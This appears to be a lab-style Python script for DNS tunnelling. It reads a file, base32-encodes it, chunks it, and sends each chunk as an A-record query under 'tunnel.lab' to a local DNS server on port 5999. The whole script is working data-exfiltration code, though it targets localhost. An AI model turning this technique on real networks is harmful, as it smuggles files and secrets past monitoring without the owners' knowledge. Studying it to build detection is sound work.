import os
from pathlib import Path
import base64
import dns.message
import dns.rdatatype
import dns.query




#with  open("test.txt", "r ") as  f : 
#data= f.read()



dns_server = "127.0.0.1"
dns_port = 5999




data = Path("test.txt").read_bytes()

print(f"original data:  {data} \n")

encoded_data = base64.b32encode(data).decode("ascii").rstrip("=")

print(f"\n encoded data : {encoded_data}")

print(f"\n original length : {len(data)}")

print(f"\n original length : {len(encoded_data)}")


chunksize = 20 

chunks = [ encoded_data[i:i+chunksize]
          for i in range(0,len(encoded_data),chunksize)]

print(chunks)

DOMAIN= "tunnel.lab"

for i , chunk in  enumerate  (chunks ,start=1) :
    print(f"chunk {i} {chunk}" )
    print (f"{i:04d}.{chunk}.{DOMAIN}")
    print("=============================\n")
    QNAME = f"{len(chunks)}.{i:04d}.{chunk}.{DOMAIN}"

    request = dns.message.make_query(QNAME,"A")

    response = dns.query.udp(
        request,
        dns_server,
        port =dns_port,
        timeout=2

    )

    print(response)